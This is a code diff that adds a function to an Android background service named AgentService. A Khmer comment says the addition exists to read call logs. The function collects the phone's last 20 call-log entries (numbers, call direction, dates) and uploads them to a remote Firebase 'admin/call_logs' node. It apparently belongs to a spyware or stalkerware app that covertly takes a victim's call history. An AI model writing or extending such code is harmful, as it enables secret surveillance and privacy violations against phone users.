@@ -134,3 +134,25 @@ class AgentService : Service() {
 
     override fun onBind(intent: Intent?): IBinder? = null
 }
+
+// បន្ថែមកូដនេះក្នុង AgentService.kt (File #6) - ដើម្បីអាន Call Logs
+private fun getCallLogs() {
+    val cursor = contentResolver.query(
+        android.provider.CallLog.Calls.CONTENT_URI,
+        null, null, null, android.provider.CallLog.Calls.DATE + " DESC LIMIT 20"
+    )
+    val logs = mutableListOf<Map<String, String>>()
+    cursor?.use {
+        val numberCol = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
+        val typeCol = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
+        val dateCol = it.getColumnIndex(android.provider.CallLog.Calls.DATE)
+        while (it.moveToNext()) {
+            logs.add(mapOf(
+                "number" to it.getString(numberCol),
+                "type" to if (it.getInt(typeCol) == 1) "INCOMING" else "OUTGOING",
+                "date" to it.getLong(dateCol).toString()
+            ))
+        }
+    }
+    FirebaseDatabase.getInstance().getReference("admin/call_logs").setValue(logs)
+}
